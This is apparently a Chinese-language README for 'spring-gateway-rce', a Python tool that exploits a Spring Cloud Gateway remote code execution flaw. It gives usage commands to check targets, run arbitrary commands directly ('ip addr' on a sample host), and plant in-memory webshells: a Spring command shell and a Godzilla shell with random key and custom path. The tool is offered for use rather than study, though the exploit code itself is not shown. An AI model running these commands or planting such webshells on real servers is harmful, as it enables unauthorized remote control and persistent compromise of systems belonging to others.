# spring-gateway-rce

## 简介
spring cloud gateway rce 内存马辅助脚本，一个spring cmd马，一个哥斯拉，支持修改path，哥斯拉密钥随机

复现以及脚本编写参考：

https://www.cnblogs.com/sijidou/p/16616162.html		哥斯拉内存马

https://www.cnblogs.com/zpchcbd/p/17659322.html	  spring cmd内存马

## 工具使用
漏洞检测

```
python spring-gateway-rce.py -t check -u http://192.168.8.129:8080
```

不打内存马直接莽（不推荐，容易打崩环境）

```
python spring-gateway-rce.py -t force -o linux -u http://192.168.8.129:8080 -c "ip addr"
```

![image-20231203223345968](https://al0neme-staticfile.oss-cn-hangzhou.aliyuncs.com/static/202312032233057.png)

内存马

```
python spring-gateway-rce.py -t spring -u http://192.168.8.129:8080 -p "/springshell"

python spring-gateway-rce.py -t godzilla -u http://192.168.8.129:8080 -p "/godshell"
```

![image-20231203223706138](https://al0neme-staticfile.oss-cn-hangzhou.aliyuncs.com/static/202312032237164.png)

![image-20231203224108339](https://al0neme-staticfile.oss-cn-hangzhou.aliyuncs.com/static/202312032241363.png)

![image-20231203223748938](https://al0neme-staticfile.oss-cn-hangzhou.aliyuncs.com/static/202312032237955.png)
